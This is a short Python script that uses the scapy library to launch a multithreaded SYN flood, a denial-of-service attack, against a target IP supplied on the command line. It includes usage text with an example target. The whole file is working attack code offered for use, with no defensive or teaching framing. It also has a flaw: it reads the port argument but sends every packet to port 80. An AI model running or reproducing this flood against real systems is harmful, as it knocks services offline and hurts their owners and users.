from scapy.all import *
from time import sleep
import _thread
import random
import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) !=  4:
	print("Usage: ./synflood.py [Target IP] [Port] [Threads]")
	print("Example: ./synflood.py 1.1.1.1 80 20")
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

print("SYN Flooding... press Ctrl+C to stop...")
def synflood(target, port):
	while 0==0:
		x = random.randint(0, 65535)
		send(IP(dst = target)/TCP(dport=80, sport = RandShort()),verbose = 0)
for x in range(0, threads):
	_thread.start_new_thread(synflood, (target,port))

while 1:
	sleep(0)
